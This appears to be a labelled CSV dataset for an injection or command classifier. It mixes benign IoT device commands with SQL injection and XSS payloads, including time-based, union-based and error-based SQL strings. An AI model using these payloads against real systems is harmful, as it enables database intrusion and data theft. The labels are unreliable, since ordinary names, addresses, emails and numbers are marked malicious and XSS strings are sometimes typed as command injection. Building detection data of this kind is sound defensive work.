payload,label,attack_type
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'hstg' like 'hstg",malicious,cmd_parse_error
1102,malicious,cmd_parse_error
"run_cmd, ADD 409 908",benign,norm
"echo, ['ready', 'sensor']",benign,norm
lijphart,malicious,cmd_parse_error
"1));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmdi
"echo, ['safe', 'report']",benign,norm
"start_temp_report, 30",benign,norm
"start_temp_report, 38",benign,norm
"run_cmd, ADD 973 189",benign,norm
isador,malicious,cmd_parse_error
"run_cmd, ADD 900 719",benign,norm
1' where 6116=6116;select (case when (7033=1594) then 7033 else 7033*(select 7033 from information_schema.character_sets) end)#,malicious,cmdi
"run_cmd, echo ['device', 'ready', 'mqtt']",benign,norm
"1"")) and sleep(5) and ((""timv""=""timv",malicious,cmd_parse_error
nicastro,malicious,cmd_parse_error
"echo, ['world', 'normal', 'ready']",benign,norm
/////////{file},malicious,cmd_parse_error
hevia oti,malicious,cmd_parse_error
6371,malicious,cmd_parse_error
"run_cmd, ADD 274 257",benign,norm
"start_temp_report, 116",benign,norm
"start_temp_report, 66",benign,norm
"start_temp_report, 120",benign,norm
24645898h,malicious,cmd_parse_error
"start_temp_report, 51",benign,norm
"run_cmd, ADD 577 315",benign,norm
46725,malicious,cmd_parse_error
"run_cmd, echo ['hello']",benign,norm
loomis@menorca.com.bb,malicious,cmd_parse_error
"echo, ['iot', 'device', 'hello', 'ready']",benign,norm
"c/ estambul, 117",malicious,cmd_parse_error
79144797a,malicious,cmd_parse_error
f1581il2ente,malicious,cmd_parse_error
"1%"" and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
"-1<div style=""width: expression(document.cookie=true);"">",malicious,cmdi
"start_temp_report, 90",benign,norm
gallegos angeleri,malicious,cmd_parse_error
"calle rendona 45, 5-a",malicious,cmd_parse_error
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('iwkg'='iwkg",malicious,cmd_parse_error
krug,malicious,cmd_parse_error
"echo, ['report', 'esp32', 'mqtt']",benign,norm
-1796') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('lpuw' like 'lpuw,malicious,cmdi
"calle neptuno 162,",malicious,cmd_parse_error
"echo, ['mqtt', 'ok']",benign,norm
"1);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (1491=1491",malicious,cmdi
"start_temp_report, 24",benign,norm
"start_temp_report, 56",benign,norm
-8015) where 9808=9808 or 9323=9323#,malicious,cmd_parse_error
"run_cmd, ADD 582 512",benign,norm
"-7884"" where 3297=3297 or 2492=6158",malicious,cmd_parse_error
"-4176'+(select 'muio' where 4256=4256 union all select 4256,4256,4256,4256,4256,4256#",malicious,cmd_parse_error
eden,malicious,cmd_parse_error
7192,malicious,cmd_parse_error
"echo, ['ping', 'report', 'hello', 'esp32']",benign,norm
"1)) union all select null,null,null,null,null,null#",malicious,cmd_parse_error
"1'||(select 'fmss' from dual where 7025=7025 or 8421=(select count(*) from generate_series(1,5000000)))||'",malicious,cmdi
"1' in boolean mode) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",malicious,cmdi
"start_temp_report, 113",benign,norm
"1) union all select null,null#",malicious,cmd_parse_error
"run_cmd, ADD 809 988",benign,norm
"-8940"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""vnuo"" like ""vnuo",malicious,cmdi
"echo, ['hello', 'ready']",benign,norm
"run_cmd, ADD 47 759",benign,norm
1));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,malicious,cmdi
3013,malicious,cmd_parse_error
"run_cmd, echo ['data', 'iot', 'ready']",benign,norm
"run_cmd, echo ['device']",benign,norm
-8639) or 8138=6252,malicious,cmd_parse_error
"run_cmd, ADD 521 692",benign,norm
incisivo,malicious,cmd_parse_error
"start_temp_report, 12",benign,norm
"start_temp_report, 108",benign,norm
"run_cmd, ADD 320 253",benign,norm
"""x""><img onerror=""alert(1)""></picture>",malicious,xss
krajacic,malicious,cmd_parse_error
1'||(select 'nwve' where 7721=7721;begin user_lock.sleep(5); end--,malicious,cmdi
"1') where 4786=4786 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",malicious,cmd_parse_error
"run_cmd, ADD 310 967",benign,norm
venancia,malicious,cmd_parse_error
"terque 135, 7-c",malicious,cmd_parse_error
"run_cmd, ADD 587 742",benign,norm
"echo, ['hello', 'esp32']",benign,norm
1')) waitfor delay '0:0:5'--,malicious,cmd_parse_error
"echo, ['esp32', 'data']",benign,norm
bain@raullazaro.pm,malicious,cmd_parse_error
ernesto,malicious,cmd_parse_error
"<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//",malicious,cmdi
calle alferez gonzalez moro 120 11-e,malicious,cmd_parse_error
"start_temp_report, 3",benign,norm
"run_cmd, echo ['payload']",benign,norm
"calle condor, 193 10f",malicious,cmd_parse_error
"1"")) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,cmd_parse_error
"run_cmd, ADD 659 455",benign,norm
"start_temp_report, 41",benign,norm
"start_temp_report, 39",benign,norm
"run_cmd, ADD 624 482",benign,norm
"run_cmd, echo ['mqtt', 'safe', 'ready', 'iot']",benign,norm
stratten,malicious,cmd_parse_error
"start_temp_report, 96",benign,norm
"run_cmd, echo ['status']",benign,norm
carlosmara,malicious,cmd_parse_error
betancur,malicious,cmd_parse_error
56876281h,malicious,cmd_parse_error
"run_cmd, ADD 872 451",benign,norm
"start_temp_report, 24",benign,norm
"echo, ['mqtt', 'system', 'data', 'normal']",benign,norm
"calle bartolome sierra, 115 7h",malicious,cmd_parse_error
"echo, ['status', 'world', 'device']",benign,norm
"<style type=""text/css"">body{background:url(""javascript:alert('xss')"")}</style>",malicious,xss
"run_cmd, ADD 181 199",benign,norm
"run_cmd, ADD 784 317",benign,norm
"1"")));select case when 6229=2077 then 1 else null end--",malicious,cmdi
lucidio,malicious,cmd_parse_error
"start_temp_report, 116",benign,norm
"1"") as lipa where 3450=3450 and make_set(8403=8403,8899)--",malicious,cmd_parse_error
sanchon vilavend,malicious,cmd_parse_error
tobar,malicious,cmd_parse_error
"echo, ['system', 'mqtt', 'payload']",benign,norm
"echo, ['ping']",benign,norm
62746544z,malicious,cmd_parse_error
1) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (4703=4703,malicious,cmd_parse_error
"run_cmd, echo ['normal', 'ping']",benign,norm
"run_cmd, ADD 923 168",benign,norm
50236,malicious,cmd_parse_error
"run_cmd, echo ['status']",benign,norm
"run_cmd, ADD 135 488",benign,norm
"calle virgen de la fuensanta, 50 3?b",malicious,cmd_parse_error
"1) as nfgb where 2503=2503 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",malicious,cmdi
08098625a,malicious,cmd_parse_error
"echo, ['status', 'mqtt']",benign,norm
"run_cmd, echo ['ping', 'status', 'ready']",benign,norm
"start_temp_report, 107",benign,norm
"-9140"")) union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#",malicious,cmd_parse_error
-7207' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'obxw'='obxw,malicious,cmdi
"run_cmd, echo ['mqtt']",benign,norm
"start_temp_report, 85",benign,norm
romaguera camargo,malicious,cmd_parse_error
"run_cmd, echo ['system', 'ok']",benign,norm
"echo, ['world']",benign,norm
"run_cmd, echo ['device']",benign,norm
erguven,malicious,cmd_parse_error
"echo, ['system', 'status']",benign,norm
"run_cmd, echo ['report', 'payload', 'mqtt', 'ping']",benign,norm
"echo, ['normal']",benign,norm
"-6263%"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",malicious,cmdi
"run_cmd, echo ['data', 'status']",benign,norm
adapuesto,malicious,cmd_parse_error
"run_cmd, ADD 999 370",benign,norm
"c/ ruiz de salazar, 49 4d",malicious,cmd_parse_error
"run_cmd, ADD 481 996",benign,norm
1858844591273979,malicious,cmd_parse_error
"start_temp_report, 6",benign,norm
"run_cmd, ADD 776 605",benign,norm
"run_cmd, echo ['payload', 'status', 'world']",benign,norm
"run_cmd, ADD 895 510",benign,norm
marion,malicious,cmd_parse_error
"1)));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((9348=9348",malicious,cmdi
00nd11e0,malicious,cmd_parse_error
ratnam,malicious,cmd_parse_error
"1' in boolean mode) union all select null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
"1%'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('%'='",malicious,cmdi
"-8178) union all select 4163,4163,4163,4163,4163,4163,4163--",malicious,cmd_parse_error
edelmar,malicious,cmd_parse_error
"-9737""))) order by 1--",malicious,cmd_parse_error
"1"") where 6367=6367 union all select null,null,null,null,null,null,null#",malicious,cmd_parse_error
ch61c795,malicious,cmd_parse_error
"calle sagristans, 132,",malicious,cmd_parse_error
80914738w,malicious,cmd_parse_error
ci7806c8t7,malicious,cmd_parse_error
"1""))) or 8156=(select count(*) from generate_series(1,5000000))--",malicious,cmd_parse_error
"start_temp_report, 32",benign,norm
martinsan.broughton@etxarriaranatz.ck,malicious,cmd_parse_error
"run_cmd, ADD 6 999",benign,norm
di9l,malicious,cmd_parse_error
06001,malicious,cmd_parse_error
"echo, ['mqtt']",benign,norm
"1"" and 6969=(select 6969 from pg_sleep(5)) and ""twmy""=""twmy",malicious,cmd_parse_error
53364918l,malicious,cmd_parse_error
"run_cmd, ADD 666 870",benign,norm
"run_cmd, echo ['ok', 'iot', 'payload']",benign,norm
"start_temp_report, 13",benign,norm
"-9263') as qodg where 6798=6798 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",malicious,cmdi
"1"")) as hfma where 2654=2654 and make_set(8403=8403,8899)--",malicious,cmd_parse_error
"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('uwrm'='uwrm",malicious,cmdi
rapisarda_macginnis@discography.ye,malicious,cmd_parse_error
"1 and make_set(9542=8888,8888)-- idkn",malicious,cmd_parse_error
"run_cmd, ADD 332 652",benign,norm
"run_cmd, ADD 76 920",benign,norm
"run_cmd, ADD 0 889",benign,norm
"run_cmd, echo ['mqtt', 'world']",benign,norm
san vicente del raspeig/sant vicent del raspeig,malicious,cmd_parse_error
salter@quiromante.com.mg,malicious,cmd_parse_error
"run_cmd, echo ['normal', 'ok', 'hello', 'ping']",benign,norm
13,malicious,cmd_parse_error
"run_cmd, echo ['payload']",benign,norm
f8av2,malicious,cmd_parse_error
1'||(select 'lmsc' from dual where 1162=1162 order by 1--,malicious,cmdi
01218498g,malicious,cmd_parse_error
"start_temp_report, 75",benign,norm
22880,malicious,cmd_parse_error
"1' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,cmd_parse_error
"calle sant marti, 164",malicious,cmd_parse_error
"run_cmd, ADD 384 532",benign,norm
2035446499597811,malicious,cmd_parse_error
"1""))) union all select null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
"start_temp_report, 88",benign,norm
"run_cmd, echo ['payload', 'world', 'system', 'device']",benign,norm
"echo, ['hello', 'safe']",benign,norm
"-7032') as xmmm where 5635=5635 union all select 5635,5635,5635,5635,5635--",malicious,cmd_parse_error
"start_temp_report, 100",benign,norm
"echo, ['system']",benign,norm
"-1048%"" or 3038=3038",malicious,cmd_parse_error
"start_temp_report, 120",benign,norm
bucardo,malicious,cmd_parse_error
"echo, ['mqtt', 'system']",benign,norm
2258,malicious,cmd_parse_error
cremades@baltasarsantos.kn,malicious,cmd_parse_error
"start_temp_report, 24",benign,norm
"run_cmd, ADD 326 905",benign,norm
4140359172053437,malicious,cmd_parse_error
"gimnasia 153, 4?e",malicious,cmd_parse_error
"run_cmd, ADD 254 566",benign,norm
1))) and 2006=2006,malicious,cmd_parse_error
"-1187') union all select 8202,8202,8202,8202,8202,8202,8202#",malicious,cmd_parse_error
salina-sonajew@almeriastella.vg,malicious,cmd_parse_error
"run_cmd, ADD 143 395",benign,norm
goldsmith1@esmarbella.ht,malicious,cmd_parse_error
23,malicious,cmd_parse_error
34361279s,malicious,cmd_parse_error
"start_temp_report, 64",benign,norm
"1' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,cmdi
1 or 4240=(select 4240 from pg_sleep(5))--,malicious,cmd_parse_error
pi9h329a,malicious,cmd_parse_error
sabu@aridossanchez.lt,malicious,cmd_parse_error
"run_cmd, echo ['report', 'status']",benign,norm
zens-trebaol6@gesautonomos.rw,malicious,cmd_parse_error
"start_temp_report, 19",benign,norm
armua,malicious,cmd_parse_error
1') where 7908=7908 or sleep(5)--,malicious,cmd_parse_error
"start_temp_report, 102",benign,norm
f8rol5ra,malicious,cmd_parse_error
0003204654562755,malicious,cmd_parse_error
"1'||(select 'bnaz' from dual where 7168=7168 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmdi
"1%"" and 8407=(select count(*) from generate_series(1,5000000)) and ""%""=""",malicious,cmd_parse_error
"1%'))) union all select null,null,null,null,null--",malicious,cmd_parse_error
"run_cmd, echo ['ok', 'normal', 'iot', 'sensor']",benign,norm
"-5150))) union all select 5660,5660,5660#",malicious,cmd_parse_error
"echo, ['normal', 'status']",benign,norm
81878772z,malicious,cmd_parse_error
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)-- wvjy",malicious,cmd_parse_error
"run_cmd, echo ['payload']",benign,norm
16300,malicious,cmd_parse_error
wardle,malicious,cmd_parse_error
"echo, ['esp32', 'world']",benign,norm
"run_cmd, ADD 767 138",benign,norm
"run_cmd, echo ['ping']",benign,norm
"echo, ['status', 'hello']",benign,norm
inanimada,malicious,cmd_parse_error
san juan bosco 113 1-d,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'world', 'payload']",benign,norm
"run_cmd, echo ['mqtt']",benign,norm
1')) as yqcl where 5026=5026 rlike (select * from (select(sleep(5)))sgvo)--,malicious,cmd_parse_error
zoratti,malicious,cmd_parse_error
1%')) union all select null--,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'status', 'data', 'report']",benign,norm
"run_cmd, ADD 90 588",benign,norm
1')) as zbkp where 1720=1720 and 4110=6748#,malicious,cmd_parse_error
"echo, ['system', 'sensor']",benign,norm
trooger_gereighty@quierocortinas.mil,malicious,cmd_parse_error
82497790x,malicious,cmd_parse_error
guinee@misanimalesdomesticos.jp,malicious,cmd_parse_error
"run_cmd, ADD 296 703",benign,norm
"1""))) and (7396=6351)*6351 and (((""xerw"" like ""xerw",malicious,cmd_parse_error
giulivo padilla,malicious,cmd_parse_error
"run_cmd, ADD 350 188",benign,norm
"1)) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((3003=3003",malicious,cmd_parse_error
"start_temp_report, 66",benign,norm
dev,malicious,cmd_parse_error
"start_temp_report, 76",benign,norm
"run_cmd, echo ['safe']",benign,norm
"-8999"" where 2821=2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",malicious,cmd_parse_error
22961726k,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'mqtt', 'report']",benign,norm
"run_cmd, ADD 100 607",benign,norm
argentino,malicious,cmd_parse_error
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('czqk' like 'czqk,malicious,cmd_parse_error
"run_cmd, ADD 446 709",benign,norm
"1"") as oztl where 6655=6655 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,cmd_parse_error
-8056)) as botl where 9225=9225 or (1182=7641)*7641--,malicious,cmd_parse_error
"run_cmd, ADD 825 8",benign,norm
"run_cmd, echo ['mqtt', 'esp32']",benign,norm
"run_cmd, ADD 583 689",benign,norm
03789,malicious,cmd_parse_error
-4082)) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((7874=7874,malicious,cmdi
"start_temp_report, 42",benign,norm
12489,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'data']",benign,norm
"run_cmd, ADD 423 517",benign,norm
"echo, ['safe', 'iot']",benign,norm
"run_cmd, ADD 426 357",benign,norm
"run_cmd, ADD 112 984",benign,norm
"start_temp_report, 36",benign,norm
"praza francisco fernandez del riego, 131",malicious,cmd_parse_error
vilasis mena,malicious,cmd_parse_error
"-1512 union all select 9013,9013,9013,9013#",malicious,cmd_parse_error
"run_cmd, echo ['normal', 'mqtt', 'ping']",benign,norm
"echo, ['world', 'status']",benign,norm
"-3109"" or elt(1032=1032,3623)",malicious,cmd_parse_error
2161o1o,malicious,cmd_parse_error
hanley,malicious,cmd_parse_error
"run_cmd, echo ['iot']",benign,norm
"echo, ['ping', 'hello']",benign,norm
carbunclo,malicious,cmd_parse_error
alfonso,malicious,cmd_parse_error
